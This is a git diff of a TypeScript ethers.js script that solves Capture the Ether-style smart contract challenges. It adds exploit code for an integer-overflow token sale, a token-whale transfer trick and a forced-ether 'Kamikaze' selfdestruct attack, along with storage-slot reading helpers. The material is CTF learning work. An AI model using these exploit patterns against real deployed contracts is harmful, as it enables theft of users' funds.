@@ -8,6 +8,27 @@ function right_pad(b: Buffer, len: number, char = '\x00') {
 	return newb.fill(char, b.length, len)
 }
 
+async function step(desc: string, promise: Promise<any>) {
+	console.log('\x1B[1;32m', desc, '\x1B[0m : ') 
+	let res = await promise
+	// auto-wait on transactions
+	if (res.wait) await res.wait()
+	console.log('   >', res)
+	return res
+}
+
+// @param mapSlot ethers.BigNumber
+async function getMappingAtAddress(contract: string, mapSlot: any, at: String) {
+	const abiCoder = new ethers.utils.AbiCoder();
+                                                  
+    return await ethers.provider.getStorageAt(contract, 
+                    ethers.utils.keccak256(abiCoder.encode(
+                     ['address', 'uint256'],      
+                     [at, ethers.BigNumber.from(mapSlot)]
+              ))                               
+    )                                             
+}
+
 async function setNickname() {
 	let contract = new ethers.Contract(
 		'0x71c46Ed333C35e4E6c62D32dc7C8F00D125b4fee',
@@ -166,11 +187,142 @@ async function predictBlockHashChallenge() {
 	return null
 }
 
-async function main() {
-	signer = (await ethers.getSigners())[0];
-	console.log('signer', signer.address)
+async function tokenSaleChallenge() {
+	//let factory = await ethers.getContractFactory('TokenSaleChallenge')
+	//let localChallenge = await factory.deploy(signer.address, { value: one_eth })
+    let target = new ethers.Contract(
+		'0x82ed8f5066dA4C371eE683C77c424e83188c7b8B',
+		//localChallenge.address,
+		[
+            'function isComplete() public view returns (bool)',
+			'function buy(uint256 numTokens) public payable',
+			'function sell(uint256 numTokens) public'
+        ], signer
+    )
+	// it's overflow game
+	// e = one_eth
+	// mask = 2^255
+	// x, y, z = unknown
+	// y - being passed in
+	// x - maybe can fix it at 1
+	// z - anything
+	// (e * x) + mask*z = e * y
+	//    ^ -- small number 
+	//     very big number -^
+	//    <=>
+	// e * x = e * y (mod mask)
+	//
+	// special case
+	//	e * 1 = e * y (mod mask)
+	//	e = e * y (mod mask)
+	//	   <=>
+	//	e + mask*z == e * y   // -e
+	//	(1) mask * z == e * (y - 1)
+	//	z == e * (y - 1) / mask
+	//
+	//	let l = lcm(mask, e)
+	//  let z = l / mask
+	//  let y = 1 + (l / e)
+	//    
+	//
+	//
+	//let goalNumber = ethers.BigNumber.from('0x0000000000000000000000000000000000000000000000000000000000000000')
+	let z = ethers.BigNumber.from('200000000000000000')
+	let y = ethers.BigNumber.from('0x3333333333333333333333333333333333333333333333333333333333333334')
+	// somehow my calculations are off by 2*10^x but it can still work
+	//await step('overflowing buy', target.buy(y, { value: ethers.BigNumber.from('800000000000000000'), gasLimit: 200_000 }))
+	/*
+numTokens			23158417847463239084714197001737581570653996933128112807891516801582625927988
+ msg.value			1000000000000000000
+ multiple			800000000000000000
+ price per token	1000000000000000000
+ */
 
-	let contract = await predictBlockHashChallenge()
+	const abiCoder = new ethers.utils.AbiCoder();
+	console.log(await ethers.provider.getStorageAt(target.address, 
+				 ethers.utils.keccak256(abiCoder.encode(
+					 ['address', 'uint256'],
+					 [signer.address, ethers.BigNumber.from(0)]))
+	  ))
+					 /*
+					 Buffer.from(
+						 '0x000000000000000000000000' + 
+						 signer.address.substring(2) + 
+						 '00'
+					 , 'hex'))))
+				 */
+	let before = await ethers.provider.getBalance(signer.address)
+	await step('selling something to get cash', target.sell(2))
+	let after = await ethers.provider.getBalance(signer.address)
+	console.log({gained : after.sub(before),
+			   before: before.toString(),
+			   after: after.toString()})
+}
+
+async function tokenWhaleChallenge() {
+    let target = new ethers.Contract(
+		'0x0ED3a022D58803390ffD4e2c47983f52729C46C9',
+		[
+            'function isComplete() public view returns (bool)',
+			'function transfer(address to, uint256 value) public',
+			'function approve(address spender, uint256 value) public',
+			'function transferFrom(address from, address to, uint256 value) public'
+        ], signer
+    )
+
+	let friend = (await ethers.getSigners())[1]
+	let passerby = (await ethers.getSigners())[2]
+	console.log('friend (pls fund): ', friend.address, ' balance ', await ethers.provider.getBalance(friend.address))
+	if ((await ethers.provider.getBalance(friend.address)).isZero()) {
+		await signer.sendTransaction({ to: friend.address, value: one_eth.mul(2) })
+	}
+
+	console.log('signer balance', await getMappingAtAddress(target.address, 2, signer.address))
+
+	// allowance : victim -> spender -> amount
+	/*
+	await step('a friend approves',
+			   target.connect(signer)
+			   .approve(
+				   friend.address,
+                   ethers.BigNumber.from('0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff')))
+    await step('transferFrom friend',   
+               target.connect(friend)   
+               .transferFrom(           
+                   signer.address,      
+				   passerby.address,
+                   1000,             
+				   { gasLimit: 200_000 }))
+   */
+	await step('whale friend now gives something to signer', 
+			   target.connect(friend)
+				.transfer(signer.address, 8_000_000_000))
+	console.log('friend balance', await getMappingAtAddress(target.address, 2, friend.address))
+	console.log('passerby balance:', await getMappingAtAddress(target.address, 2, passerby.address))
+    return target                                 
+}                                                 
+                                                  
+async function retirementFundChallenge() {
+    let target = new ethers.Contract(
+		'0xDd0DB72C1fdC774D6Cd8142aeAfeDe8E9fae9B1E',
+		[
+            'function isComplete() public view returns (bool)',
+			'function collectPenalty() public'
+        ], signer
+    )
+	let kamikazeFactory = await ethers.getContractFactory('Kamikaze')
+	let kamikaze = await kamikazeFactory.deploy({ value: one_eth.mul(3) })
+
+	await step('overfund', kamikaze.bye(target.address))
+	await step('withdraw', target.collectPenalty({ gasLimit: 500_000 }))
+	return target
+}
+                                                  
+async function main() {                           
+    signer = (await ethers.getSigners())[0];      
+    console.log('signer', signer.address)         
+
+	let contract = await retirementFundChallenge()
 
 
 	/*
